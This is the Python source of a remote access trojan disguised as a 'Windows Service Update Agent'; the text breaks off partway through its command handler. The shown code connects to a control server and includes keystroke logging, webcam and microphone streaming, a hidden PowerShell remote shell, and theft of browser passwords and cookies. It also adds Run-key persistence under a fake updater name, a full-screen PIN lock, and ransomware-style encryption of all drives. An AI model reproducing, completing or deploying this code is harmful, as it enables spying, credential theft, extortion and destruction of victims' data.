"""
Windows Service Update Agent
Remote monitoring and administration tool.
"""
import sys
import os
import asyncio
import json
import uuid
import platform
import socket
import time
import subprocess
import shutil
import base64
import struct
import threading
import concurrent.futures
import queue as thread_queue
import sqlite3
import webbrowser
import wave
from io import BytesIO
from collections import deque

# Third-party
try:
    import mss
    import websockets
    from websockets.exceptions import ConnectionClosed
    from PIL import Image
    from pynput.mouse import Controller as MouseController, Button
    from pynput.keyboard import Controller as KeyboardController, Listener as KeyboardListener, Key
except ImportError:
    websockets = None

    class ConnectionClosed(Exception):
        """Placeholder when websockets is not installed."""

    pass

try:
    import sounddevice as sd
    import numpy as np
    AUDIO_BACKEND = 'sounddevice'
    SOUND_DEVICE_AVAILABLE = True
except Exception:
    try:
        import pyaudio
        import numpy as np
        AUDIO_BACKEND = 'pyaudio'
        SOUND_DEVICE_AVAILABLE = True
    except Exception:
        AUDIO_BACKEND = None
        SOUND_DEVICE_AVAILABLE = False
        try:
            import numpy as np  # still useful for inject / resample when capture unavailable
        except Exception:
            np = None  # noqa: F401

# Optional imports - only used when specific commands are triggered
# cv2, win32crypt, tkinter loaded on-demand

# ─── Configuration (Builder injects these) ────────────────────

SERVER_IP = os.environ.get("SERVER_IP", "127.0.0.1")  # default to local server for testing
SERVER_PORT = int(os.environ.get("SERVER_PORT", os.environ.get("PORT", "8080")))

# ─── Protocol ─────────────────────────────────────────────────

CMD_REG      = 0x4B
CMD_KEYLOG   = 0x0C
CMD_CAM      = 0x0E
CMD_SHELL    = 0x0F
CMD_FILE_LS  = 0x11
CMD_FILE_RUN = 0x12
CMD_FILE_DL  = 0x13
CMD_LOCK     = 0x20
CMD_ENCRYPT  = 0x21
CMD_VAULT    = 0x30
CMD_COOKIES  = 0x32
CMD_URL      = 0x40
CMD_DL_EXE   = 0x41
CMD_VIEW     = 0x15
CMD_SOUND    = 0x60
CMD_MOUSE    = 0x50
CMD_CLICK    = 0x51
CMD_KEY      = 0x52
CMD_PING     = 0x7E

# ─── State ────────────────────────────────────────────────────

DEVICE_ID = str(uuid.uuid4())
HOSTNAME = socket.gethostname()
_keylog_on = False
_keybuf = ""
_view_mode = "screen"  # 'screen' or 'cam'
_cam_stream_enabled = False
_audio_enabled = False
_audio_queue = deque(maxlen=80)
_audio_lock = threading.Lock()
_audio_stream = None
_pyaudio_instance = None
_audio_capture = None
_camera_lock = asyncio.Lock()
_audio_samplerate = 44100
_audio_channels = 1
_log_file = os.path.join(os.environ.get("TEMP", "."), "svc.log")


def _log(msg):
    try:
        with open(_log_file, "a") as f:
            f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")
    except:
        pass
    try:
        print(f"[{time.strftime('%H:%M:%S')}] {msg}")
    except:
        pass


def _open_camera():
    """
    Open webcam once and keep it open while streaming (stable OS LED, no open/close flicker).
    Prefer DirectShow on Windows — MSMF often conflicts when multiple consumers contend.
    """
    global _audio_capture
    if _audio_capture is not None:
        try:
            if _audio_capture.isOpened():
                return _audio_capture
        except Exception:
            pass
    try:
        import cv2
        if sys.platform == "win32":
            apis = (cv2.CAP_DSHOW, cv2.CAP_MSMF, cv2.CAP_ANY)
        else:
            apis = (cv2.CAP_ANY,)
        for api in apis:
            try:
                cap = cv2.VideoCapture(0, api)
                if cap.isOpened():
                    cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
                    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
                    cap.set(cv2.CAP_PROP_FPS, 30)
                    _audio_capture = cap
                    return cap
                cap.release()
            except Exception:
                pass
    except Exception as e:
        _log(f"Camera module open failed: {e}")
    _audio_capture = None
    return None


def _close_camera():
    global _audio_capture
    try:
        if _audio_capture is not None:
            _audio_capture.release()
    except Exception:
        pass
    _audio_capture = None


def _camera_needed():
    return _view_mode == "cam" or _cam_stream_enabled




def _sd_preferred_input_device():
    """Prefer Windows 'Stereo Mix' / loopback-style inputs so remote listen captures system audio."""
    if AUDIO_BACKEND != "sounddevice":
        return None
    try:
        import sounddevice as sd
    except Exception:
        return None
    try:
        devices = sd.query_devices()
        keys = ("stereo mix", "what u hear", "wave out mix", "loopback")
        best = None
        for i, d in enumerate(devices):
            if int(d.get("max_input_channels") or 0) < 1:
                continue
            nm = (d.get("name") or "").lower()
            for k in keys:
                if k in nm:
                    return i
        return None
    except Exception:
        return None


def _shell_ps_command(cmdline, cdir):
    """
    When cwd is set, run inside that directory in the same -Command invocation.
    Avoids relying on subprocess cwd alone for drive roots and matches explorer paths.
    """
    if not cdir:
        return cmdline
    lit = str(cdir).replace("'", "''")
    return f"Set-Location -LiteralPath '{lit}'; " + cmdline


def _powershell_argv(cmdline: str):
    """Prefer PowerShell 7 (pwsh); bypass execution policy scan for faster cold start."""
    common = ["-NoProfile", "-NonInteractive", "-NoLogo", "-ExecutionPolicy", "Bypass", "-Command", cmdline]
    pw = shutil.which("pwsh")
    if pw:
        return [pw] + common
    ps = shutil.which("powershell.exe") or shutil.which("powershell")
    if ps:
        return [ps] + common
    return ["powershell"] + common


def _pcm_stream_packet(pcm_s16le: bytes, samplerate: int = 44100) -> bytes:
    """Low-latency remote listen: raw mono s16le; browser schedules with AudioContext."""
    n = len(pcm_s16le) // 2
    if n <= 0:
        return b""
    return b"\x04" + struct.pack("<HH", min(int(samplerate), 65535), n) + pcm_s16le


def _audio_put(pkt: bytes):
    """Thread-safe enqueue from PyAudio/sounddevice callbacks (different thread than asyncio loop)."""
    if not pkt:
        return
    with _audio_lock:
        _audio_queue.append(pkt)
        while len(_audio_queue) > 64:
            _audio_queue.popleft()


def _audio_try_pop():
    with _audio_lock:
        if not _audio_queue:
            return None
        return _audio_queue.popleft()


# ─── Remote mic (admin → agent) continuous playback ─────────────
_remote_mic_q = thread_queue.Queue(maxsize=48)
_remote_mic_thread = None
_remote_mic_stop = threading.Event()

_sound_rx_buf = None
_sound_rx_total = 0


def _parse_pcm_body(body: bytes):
    """After 0x03/0x04 prefix: <HH sample_rate, num_samples> + int16 mono."""
    if len(body) < 4:
        return None, None
    sr = body[0] | (body[1] << 8)
    n = body[2] | (body[3] << 8)
    pcm = body[4 : 4 + n * 2]
    if n <= 0 or len(pcm) < n * 2:
        return None, None
    return sr, pcm


def _remote_mic_worker():
    """Sequential PCM write to one output stream (Meet-style, no overlapping winsound)."""
    try:
        import numpy as np
    except ImportError:
        _log("Remote mic: numpy required for playback.")
        return
    pa = None
    stream = None
    rate = 48000
    try:
        import pyaudio
        pa = pyaudio.PyAudio()
        stream = pa.open(
            format=pyaudio.paInt16,
            channels=1,
            rate=rate,
            output=True,
            frames_per_buffer=960,
        )
    except Exception as ex:
        _log(f"Remote mic PyAudio output failed: {ex}")
        if pa:
            try:
                pa.terminate()
            except Exception:
                pass
        return
    try:
        while not _remote_mic_stop.is_set():
            try:
                body = _remote_mic_q.get(timeout=0.25)
            except thread_queue.Empty:
                continue
            if body is None:
                break
            parsed = _parse_pcm_body(body)
            if not parsed or parsed[0] is None:
                continue
            sr, pcm = parsed
            arr = np.frombuffer(pcm, dtype=np.int16).copy()
            if sr != rate and sr > 0:
                n_out = max(1, int(len(arr) * rate / sr))
                arr = (
                    np.interp(
                        np.linspace(0, len(arr) - 1, n_out, dtype=np.float64),
                        np.arange(len(arr), dtype=np.float64),
                        arr.astype(np.float64),
                    )
                    .astype(np.int16)
                )
            try:
                stream.write(arr.tobytes())
            except Exception as ex:
                _log(f"Remote mic write: {ex}")
    finally:
        try:
            if stream:
                stream.stop_stream()
                stream.close()
        except Exception:
            pass
        try:
            if pa:
                pa.terminate()
        except Exception:
            pass


def _ensure_remote_mic_thread():
    global _remote_mic_thread
    if _remote_mic_thread is not None and _remote_mic_thread.is_alive():
        return
    _remote_mic_stop.clear()
    _remote_mic_thread = threading.Thread(target=_remote_mic_worker, daemon=True)
    _remote_mic_thread.start()


def _stop_remote_mic_thread():
    global _remote_mic_thread
    _remote_mic_stop.set()
    try:
        _remote_mic_q.put_nowait(None)
    except Exception:
        pass
    t = _remote_mic_thread
    _remote_mic_thread = None
    if t is not None:
        t.join(timeout=1.0)


def _feed_remote_mic_pcm(body: bytes):
    """Queue one PCM frame from dashboard (after 0x03 byte stripped)."""
    _ensure_remote_mic_thread()
    try:
        _remote_mic_q.put_nowait(body)
    except thread_queue.Full:
        try:
            _remote_mic_q.get_nowait()
        except Exception:
            pass
        try:
            _remote_mic_q.put_nowait(body)
        except Exception:
            pass


def _play_sound_inject_async(raw: bytes, name: str):
    def _run():
        if not raw or len(raw) < 4:
            _log("Inject: empty payload.")
            return
        is_wav = len(raw) >= 12 and raw[:4] == b"RIFF" and raw[8:12] == b"WAVE"
        if not is_wav:
            try:
                ext = os.path.splitext(name or "")[1] or ".audio"
                if len(ext) > 6 or not ext.startswith("."):
                    ext = ".audio"
                tmp = os.path.join(os.environ.get("TEMP", "."), f"inj_{uuid.uuid4().hex()}{ext}")
                with open(tmp, "wb") as f:
                    f.write(raw)
                if sys.platform == "win32":
                    os.startfile(tmp)
                else:
                    webbrowser.open(f"file://{tmp}")
            except Exception as ex:
                _log(f"Inject play (non-WAV) failed: {ex}")
            return
        if np is None:
            _log("Inject: numpy not available for WAV decode.")
            return
        try:
            with wave.open(BytesIO(raw), "rb") as wf:
                ch = wf.getnchannels()
                sw = wf.getsampwidth()
                sr = wf.getframerate()
                nframes = wf.getnframes()
                d = wf.readframes(nframes)
            if sw != 2:
                _log("Inject: only 16-bit WAV supported for stream play.")
                return
            arr = np.frombuffer(d, dtype=np.int16).copy()
            if ch > 1:
                arr = arr.reshape(-1, ch)[:, 0]
            try:
                import sounddevice as sd
                sd.play(arr, sr, blocking=True)
                return
            except Exception:
                pass
            try:
                import pyaudio
                pa = pyaudio.PyAudio()
                stream = pa.open(
                    format=pyaudio.paInt16,
                    channels=1,
                    rate=int(sr),
                    output=True,
                )
                stream.write(arr.tobytes())
                stream.stop_stream()
                stream.close()
                pa.terminate()
                return
            except Exception:
                pass
            import winsound
            tmp = os.path.join(os.environ.get("TEMP", "."), f"inj_{uuid.uuid4().hex}_{name}")
            with open(tmp, "wb") as f:
                f.write(raw)
            winsound.PlaySound(tmp, winsound.SND_FILENAME | winsound.SND_ASYNC)
        except Exception as ex:
            _log(f"Inject play failed: {ex}")

    threading.Thread(target=_run, daemon=True).start()


def _build_wav_chunk(frames_bytes, channels=1, samplerate=44100):
    bio = BytesIO()
    try:
        with wave.open(bio, 'wb') as wf:
            wf.setnchannels(channels)
            wf.setsampwidth(2)
            wf.setframerate(samplerate)
            wf.writeframes(frames_bytes)
        return bio.getvalue()
    except Exception as e:
        _log(f"Audio WAV build failed: {e}")
        return None


def _ensure_audio(enabled):
    global _audio_enabled, _audio_stream, _pyaudio_instance
    if not enabled:
        _audio_enabled = False
        if _audio_stream is not None:
            try:
                if AUDIO_BACKEND == "sounddevice":
                    _audio_stream.stop()
                    _audio_stream.close()
                elif AUDIO_BACKEND == "pyaudio":
                    _audio_stream.stop_stream()
                    _audio_stream.close()
            except Exception:
                pass
            _audio_stream = None
            if _pyaudio_instance is not None:
                try:
                    _pyaudio_instance.terminate()
                except Exception:
                    pass
                _pyaudio_instance = None
            _log("Audio capture stopped.")
        return

    if not SOUND_DEVICE_AVAILABLE:
        _audio_enabled = False
        _log("Audio support unavailable: sounddevice / pyaudio / numpy missing.")
        return

    if _audio_stream is not None:
        _audio_enabled = True
        return

    try:
        if AUDIO_BACKEND == "sounddevice":
            dev = _sd_preferred_input_device()

            def callback(indata, frames, time_info, status):
                if status:
                    _log(f"Audio status: {status}")
                try:
                    x = np.clip(indata, -1.0, 1.0)
                    samples = (x * 32767.0).astype(np.int16)
                    if samples.ndim > 1 and samples.shape[1] > 1:
                        samples = samples[:, 0]
                    pkt = _pcm_stream_packet(samples.tobytes(), _audio_samplerate)
                    if pkt:
                        _audio_put(pkt)
                except Exception as ex:
                    _log(f"Audio capture error: {ex}")

            try:
                _audio_stream = sd.InputStream(
                    device=dev,
                    samplerate=_audio_samplerate,
                    channels=_audio_channels,
                    dtype="float32",
                    blocksize=480,
                    callback=callback,
                )
                _audio_stream.start()
            except Exception:
                if dev is not None:
                    _log("Audio: preferred input failed, falling back to default mic.")
                    _audio_stream = sd.InputStream(
                        samplerate=_audio_samplerate,
                        channels=_audio_channels,
                        dtype="float32",
                        blocksize=480,
                        callback=callback,
                    )
                    _audio_stream.start()
                else:
                    raise
        elif AUDIO_BACKEND == "pyaudio":
            _pyaudio_instance = pyaudio.PyAudio()

            def callback(in_data, frame_count, time_info, status):
                try:
                    pkt = _pcm_stream_packet(in_data, _audio_samplerate)
                    if pkt:
                        _audio_put(pkt)
                except Exception as ex:
                    _log(f"Pyaudio capture error: {ex}")
                return (None, pyaudio.paContinue)

            _audio_stream = _pyaudio_instance.open(
                format=pyaudio.paInt16,
                channels=_audio_channels,
                rate=_audio_samplerate,
                input=True,
                frames_per_buffer=480,
                stream_callback=callback,
            )
            _audio_stream.start_stream()
        _audio_enabled = True
        _log("Audio capture started.")
    except Exception as ex:
        _audio_enabled = False
        _audio_stream = None
        if _pyaudio_instance:
            try:
                _pyaudio_instance.terminate()
            except Exception:
                pass
            _pyaudio_instance = None
        _log(f"Unable to start audio capture: {ex}")


# ─── HID ──────────────────────────────────────────────────────

_mouse = None
_kb = None

def _init_hid():
    global _mouse, _kb
    if _mouse is None:
        _mouse = MouseController()
        _kb = KeyboardController()

def do_move(x, y):
    _init_hid()
    _mouse.position = (int(x), int(y))

def do_click(btn, down):
    _init_hid()
    b = Button.left if btn == "left" else Button.right
    if down:
        _mouse.press(b)
    else:
        _mouse.release(b)

def do_key(k):
    _init_hid()
    try:
        if hasattr(Key, k):
            key = getattr(Key, k)
        else:
            key = k
        _kb.press(key)
        _kb.release(key)
    except:
        pass

# ─── Credential Harvesting ────────────────────────────────────

def _decrypt_chromium(enc_password, key):
    try:
        from Crypto.Cipher import AES
        iv = enc_password[3:15]
        payload = enc_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload[:-16]).decode()
    except Exception as e:
        try:
            import win32crypt
            return win32crypt.CryptUnprotectData(enc_password, None, None, None, 0)[1].decode()
        except:
            return ""

def _get_browser_key(user_data_path):
    try:
        import win32crypt
        ls = os.path.join(user_data_path, "Local State")
        if not os.path.exists(ls):
            return None
        with open(ls, "r", encoding="utf-8") as f:
            data = json.loads(f.read())
        ekey = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(ekey, None, None, None, 0)[1]
    except:
        return None

def harvest_passwords():
    results = []
    paths = {
        "Chrome": os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data"),
    }
    for name, udp in paths.items():
        key = _get_browser_key(udp)
        if not key:
            continue
        for profile in ["Default", "Profile 1", "Profile 2"]:
            db = os.path.join(udp, profile, "Login Data")
            if not os.path.exists(db):
                continue
            tmp = os.path.join(os.environ.get("TEMP", "."), f"ld_{name}_{profile}")
            try:
                shutil.copy2(db, tmp)
                conn = sqlite3.connect(tmp)
                for url, user, epw in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
                    pw = _decrypt_chromium(epw, key)
                    if user or pw:
                        results.append(f"[{name}] {url} | {user} | {pw}")
                conn.close()
                os.remove(tmp)
            except:
                pass
    return "\n".join(results) if results else "No credentials found."

def harvest_cookies():
    results = []
    paths = {
        "Chrome": os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data"),
    }
    for name, udp in paths.items():
        key = _get_browser_key(udp)
        if not key:
            continue
        for profile in ["Default"]:
            db = os.path.join(udp, profile, "Network", "Cookies")
            if not os.path.exists(db):
                db = os.path.join(udp, profile, "Cookies")
            if not os.path.exists(db):
                continue
            tmp = os.path.join(os.environ.get("TEMP", "."), f"ck_{name}")
            try:
                shutil.copy2(db, tmp)
                try:
                    cur = conn.execute("SELECT host_key, name, encrypted_value FROM cookies")
                except sqlite3.OperationalError:
                    cur = conn.execute("SELECT host, name, encrypted_value FROM cookies")
                for host, cname, ev in cur:
                    val = _decrypt_chromium(ev, key)
                    if val:
                        results.append(f"[{name}] {host} | {cname}={val[:80]}")
                conn.close()
                os.remove(tmp)
            except:
                pass
    return "\n".join(results[:200]) if results else "No cookies found."

# ─── System Lock ──────────────────────────────────────────────
def install_persistence():
    try:
        import winreg, sys, shutil, os
        exe = sys.executable
        if not exe.lower().endswith(".exe"): return
        appdata = os.environ.get("APPDATA", "")
        dest = os.path.join(appdata, "WinSvcUpdate.exe")
        if exe != dest:
            shutil.copy2(exe, dest)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsServiceUpdater", 0, winreg.REG_SZ, f'"{dest}"')
        winreg.CloseKey(key)
    except: pass

def check_lock_state():
    try:
        import winreg, threading
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\WinSvcUpdater", 0, winreg.KEY_READ)
        pwd, _ = winreg.QueryValueEx(key, "SysLckDwn")
        winreg.CloseKey(key)
        if pwd:
            threading.Thread(target=do_lock, args=(pwd,), daemon=True).start()
    except: pass

def set_lock_state(pwd):
    try:
        import winreg
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\WinSvcUpdater")
        winreg.SetValueEx(key, "SysLckDwn", 0, winreg.REG_SZ, pwd)
        winreg.CloseKey(key)
    except: pass

def clear_lock_state():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\WinSvcUpdater", 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(key, "SysLckDwn")
        winreg.CloseKey(key)
    except: pass

def do_lock(password):
    set_lock_state(password)
    import tkinter as tk
    from pynput import keyboard
    
    typed_pin = []
    
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.configure(bg="black")
    root.overrideredirect(True)
    tk.Label(root, text="SYSTEM LOCKED", font=("Arial", 48, "bold"), fg="red", bg="black").pack(expand=True)
    
    pin_var = tk.StringVar()
    pin_var.set("ENTER PIN")
    tk.Label(root, textvariable=pin_var, font=("Arial", 24), fg="white", bg="black").pack(pady=20)
    
    def on_press(key):
        try:
            if hasattr(key, 'char') and key.char and key.char.isdigit():
                typed_pin.append(key.char)
            elif key == keyboard.Key.backspace and typed_pin:
                typed_pin.pop()
            elif key == keyboard.Key.enter:
                if "".join(typed_pin) == password:
                    clear_lock_state()
                    root.quit()
                    return False
                else:
                    typed_pin.clear()
            
            if not typed_pin:
                pin_var.set("ENTER PIN")
            else:
                pin_var.set("*" * len(typed_pin))
        except:
            pass
            
    listener = keyboard.Listener(on_press=on_press, suppress=True)
    listener.start()
    
    root.mainloop()
    
    # Safely destroy after mainloop exits
    try:
        root.destroy()
    except:
        pass

# ─── File Encryption ──────────────────────────────────────────

def do_encrypt(password, targets=""):
    from Crypto.Cipher import AES as A
    from Crypto.Random import get_random_bytes
    import hashlib
    import string
    
    key = hashlib.sha256(password.encode()).digest()
    count = 0
    
    dirs_to_scan = []
    
    if targets and isinstance(targets, str) and targets.strip():
        dirs_to_scan = [t.strip() for t in targets.split(",") if t.strip()]
    else:
        for c_drive in string.ascii_uppercase:
            drive_path = f"{c_drive}:\\"
            if os.path.exists(drive_path):
                dirs_to_scan.append(drive_path)
            
    for d in dirs_to_scan:
        if not os.path.exists(d):
            continue
            
        def _enc_file(fp):
            nonlocal count
            try:
                with open(fp, "rb") as f:
                    data = f.read()
                iv = get_random_bytes(16)
                c = A.new(key, A.MODE_CBC, iv)
                pad = 16 - (len(data) % 16)
                with open(fp + ".locked", "wb") as f:
                    f.write(iv + c.encrypt(data + bytes([pad]) * pad))
                os.remove(fp)
                count += 1
            except:
                pass

        if os.path.isfile(d):
            if not d.endswith(".locked"):
                _enc_file(d)
        else:
            for r, _, files in os.walk(d):
                for fn in files:
                    if not fn.endswith(".locked"):
                        _enc_file(os.path.join(r, fn))
    return count

def do_decrypt(password, targets=""):
    try:
        from Crypto.Cipher import AES as A
    except ImportError:
        return 0
    import hashlib
    import string
    
    key = hashlib.sha256(password.encode()).digest()
    count = 0
    
    dirs_to_scan = []
    if targets and isinstance(targets, str) and targets.strip():
        dirs_to_scan = [t.strip() for t in targets.split(",") if t.strip()]
    else:
        for c_drive in string.ascii_uppercase:
            drive_path = f"{c_drive}:\\"
            if os.path.exists(drive_path):
                dirs_to_scan.append(drive_path)
            
    for d in dirs_to_scan:
        if not os.path.exists(d):
            continue
            
        def _dec_file(fp):
            nonlocal count
            try:
                with open(fp, "rb") as f:
                    data = f.read()
                if len(data) <= 16: return
                iv = data[:16]
                ciphertext = data[16:]
                c = A.new(key, A.MODE_CBC, iv)
                dec_padded = c.decrypt(ciphertext)
                pad_len = dec_padded[-1]
                if pad_len > 16 or pad_len < 1: return
                decrypted = dec_padded[:-pad_len]
                orig_fp = fp[:-7] if fp.endswith(".locked") else fp + ".unlocked"
                with open(orig_fp, "wb") as f:
                    f.write(decrypted)
                os.remove(fp)
                count += 1
            except: pass

        if os.path.isfile(d):
            if d.endswith(".locked"):
                _dec_file(d)
        else:
            for r, _, files in os.walk(d):
                for fn in files:
                    if fn.endswith(".locked"):
                        _dec_file(os.path.join(r, fn))
    return count

# ─── Main Loop ────────────────────────────────────────────────


async def main():
    global _keylog_on, _keybuf

    _log(f"Starting. Target: ws://{SERVER_IP}:{SERVER_PORT}/ws/client")
    retry_count = 0
    uri = f"ws://{SERVER_IP}:{SERVER_PORT}/ws/client"
    uri_cam = f"ws://{SERVER_IP}:{SERVER_PORT}/ws/client_cam"

    def _kl():
        global _keylog_on, _keybuf
        def on_press(k):
            global _keybuf
            if _keylog_on:
                try:
                    _keybuf += str(k.char)
                except:
                    _keybuf += f"[{k}]"
        try:
            with KeyboardListener(on_press=on_press) as l:
                l.join()
        except:
            pass

    threading.Thread(target=_kl, daemon=True).start()

    ws_kw = dict(
        ping_interval=20,
        ping_timeout=75,
        close_timeout=20,
        max_size=2**25,
    )

    while True:
        try:
            _log(f"Connecting to {uri}")
            async with websockets.connect(uri, **ws_kw) as ws:
                lock_ws = asyncio.Lock()

                async def send_ws(data):
                    async with lock_ws:
                        await ws.send(data)

                with mss.mss() as s:
                    m = s.monitors[0]
                    res = {"w": m["width"], "h": m["height"]}

                await send_ws(
                    json.dumps(
                        {
                            "cmd": CMD_REG,
                            "data": {
                                "id": DEVICE_ID,
                                "hostname": HOSTNAME,
                                "os": platform.platform(),
                                "is_admin": True,
                                "res": res,
                            },
                        }
                    )
                )
                _log("Control channel registered (waiting for server session)...")
                await asyncio.sleep(0.15)

                async with websockets.connect(uri_cam, **ws_kw) as cam_ws:
                    lock_cam = asyncio.Lock()

                    async def send_cam(data):
                        async with lock_cam:
                            await cam_ws.send(data)

                    await send_cam(
                        json.dumps(
                            {
                                "cmd": CMD_REG,
                                "data": {"id": DEVICE_ID},
                            }
                        )
                    )
                    _log("Registered (control + camera channels).")
                    retry_count = 0

                    async def agent_keepalive():
                        """Lightweight JSON ping so proxies/NAT see application traffic; complements WebSocket protocol pings."""
                        while True:
                            try:
                                await asyncio.sleep(22)
                                await send_ws(json.dumps({"cmd": CMD_PING, "args": {}}))
                            except (ConnectionClosed, asyncio.CancelledError):
                                break
                            except Exception:
                                break

                    async def recv_loop():
                        global _keylog_on, _keybuf, _view_mode, _cam_stream_enabled
                        while True:
                            raw = await ws.recv()
                            if isinstance(raw, bytes):
                                if len(raw) > 1 and raw[0] == 0x03:
                                    audio_data = raw[1:]
                                    try:
                                        if len(audio_data) >= 12 and audio_data[:4] == b"RIFF":
                                            tmp = os.path.join(os.environ.get("TEMP", "."), f"admin_audio_{uuid.uuid4().hex}.wav")
                                            with open(tmp, "wb") as f:
                                                f.write(audio_data)
                                            try:
                                                import winsound
                                                winsound.PlaySound(tmp, winsound.SND_FILENAME | winsound.SND_ASYNC)
                                            except Exception:
                                                _log(f"Admin audio chunk saved to {tmp}")
                                        else:
                                            _feed_remote_mic_pcm(audio_data)
                                    except Exception as ex:
                                        _log(f"Admin audio playback failed: {ex}")
                                continue

                            msg = json.loads(raw)
                            cmd = msg.get("cmd")
                            a = msg.get("args", {})
                            try:
                                if cmd == CMD_MOUSE:
                                    do_move(a.get("x", 0), a.get("y", 0))
                                elif cmd == CMD_CLICK:
                                    do_click(a.get("btn", "left"), a.get("down", True))
                                elif cmd == CMD_KEY:
                                    do_key(a.get("key", ""))
                                elif cmd == CMD_SHELL:
                                    shell_id = a.get("shellId", "side")
                                    cmdline = a.get("cmd", "echo ok")
                                    cdir = a.get("cwd")
                                    if cdir:
                                        cdir = os.path.normpath(cdir)
                                        if not os.path.isdir(cdir):
                                            await send_ws(
                                                json.dumps(
                                                    {
                                                        "cmd": CMD_SHELL,
                                                        "data": {
                                                            "out": f"(error) Not a directory: {cdir}\n",
                                                            "shellId": shell_id,
                                                        },
                                                    }
                                                )
                                            )
                                            continue

                                    ps_cmd = _shell_ps_command(cmdline, cdir)
                                    timeout_s = 55 if shell_id == "pop" else 120

                                    def _run_powershell_sync():
                                        proc = None
                                        try:
                                            proc = subprocess.Popen(
                                                _powershell_argv(ps_cmd),
                                                stdin=subprocess.DEVNULL,
                                                stdout=subprocess.PIPE,
                                                stderr=subprocess.STDOUT,
                                                text=True,
                                                encoding="utf-8",
                                                errors="replace",
                                                cwd=cdir if cdir else None,
                                                creationflags=0x08000000,
                                            )
                                            return proc.communicate(timeout=timeout_s)[0] or ""
                                        except subprocess.TimeoutExpired:
                                            if proc is not None:
                                                try:
                                                    proc.kill()
                                                except Exception:
                                                    pass
                                            hint = ""
                                            if shell_id == "pop" and cdir:
                                                hint = " Tip: slow or removable drives can hang at the root; try a subfolder or use Get-ChildItem -Force.\n"
                                            return f"(error) Command timed out ({timeout_s}s).{hint}\n"
                                        except Exception as ex:
                                            return f"(error) {ex}\n"

                                    out = await asyncio.to_thread(_run_powershell_sync)
                                    await send_ws(
                                        json.dumps({"cmd": CMD_SHELL, "data": {"out": out, "shellId": shell_id}})
                                    )
                                elif cmd == CMD_CAM:
                                    import cv2
                                    async with _camera_lock:
                                        cap = _open_camera()
                                        if cap is not None:
                                            ret, frame = cap.read()
                                        else:
                                            ret = False
                                    if not ret:
                                        _log("CMD_CAM: unable to grab camera frame")
                                    else:
                                        _, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 60])
                                        await send_ws(b"\x01" + buf.tobytes())
                                elif cmd == CMD_VIEW:
                                    if a.get("substream") == "cam":
                                        _cam_stream_enabled = bool(a.get("enabled", False))
                                        audio_requested = bool(a.get("audio", False))
                                        _log(f"Cam substream -> {_cam_stream_enabled}, audio -> {audio_requested}")
                                        _ensure_audio(audio_requested)
                                    else:
                                        _view_mode = a.get("mode", "screen")
                                        audio_requested = bool(a.get("audio", False))
                                        _log(f"View mode → {_view_mode}, audio → {audio_requested}")
                                        _ensure_audio(audio_requested)
                                elif cmd == CMD_FILE_LS:
                                    p = a.get("path", ".")
                                    if p == "DRIVES":
                                        items = []
                                        import string
                                        for c in string.ascii_uppercase:
                                            if os.path.exists(f"{c}:\\"):
                                                items.append({"name": f"{c}:\\", "is_dir": True, "size": 0})
                                        await send_ws(json.dumps({"cmd": CMD_FILE_LS, "data": {"path": "DRIVES", "items": items}}))
                                    else:

                                        def _scan_dir(path):
                                            out_items = []
                                            try:
                                                for e in os.scandir(path):
                                                    try:
                                                        out_items.append(
                                                            {
                                                                "name": e.name,
                                                                "is_dir": e.is_dir(),
                                                                "size": e.stat().st_size if not e.is_dir() else 0,
                                                            }
                                                        )
                                                    except Exception:
                                                        pass
                                            except Exception as ex:
                                                return os.path.abspath(path), [], str(ex)
                                            return os.path.abspath(path), out_items, None

                                        abspath, items, err = await asyncio.to_thread(_scan_dir, p)
                                        if err:
                                            await send_ws(
                                                json.dumps(
                                                    {
                                                        "cmd": CMD_FILE_LS,
                                                        "data": {"path": abspath, "items": [], "error": err},
                                                    }
                                                )
                                            )
                                        else:
                                            await send_ws(
                                                json.dumps({"cmd": CMD_FILE_LS, "data": {"path": abspath, "items": items}})
                                            )
                                elif cmd == CMD_SOUND:
                                    global _sound_rx_buf, _sound_rx_total
                                    name = a.get("name", "sound.wav")
                                    if a.get("reset"):
                                        _sound_rx_buf = bytearray()
                                        _sound_rx_total = int(a.get("size", 0) or 0)
                                    chunk = a.get("b64")
                                    if chunk:
                                        if _sound_rx_buf is None:
                                            _sound_rx_buf = bytearray()
                                        try:
                                            _sound_rx_buf.extend(base64.b64decode(chunk))
                                        except Exception:
                                            pass
                                    assembling = _sound_rx_buf is not None
                                    if assembling:
                                        if len(_sound_rx_buf) > 20_000_000:
                                            _sound_rx_buf = None
                                            _sound_rx_total = 0
                                            _log("Inject: size cap exceeded, aborted.")
                                        elif a.get("end") or (_sound_rx_total and len(_sound_rx_buf) >= _sound_rx_total):
                                            rawb = bytes(_sound_rx_buf)
                                            _sound_rx_buf = None
                                            _sound_rx_total = 0
                                            if len(rawb) > 8:
                                                _play_sound_inject_async(rawb, name)
                                    elif a.get("bytes"):
                                        try:
                                            rawb = base64.b64decode(a["bytes"])
                                            if len(rawb) > 8:
                                                _play_sound_inject_async(rawb, name)
                                        except Exception as ex:
                                            _log(f"Audio injection failed: {ex}")
                                elif cmd == CMD_FILE_RUN:
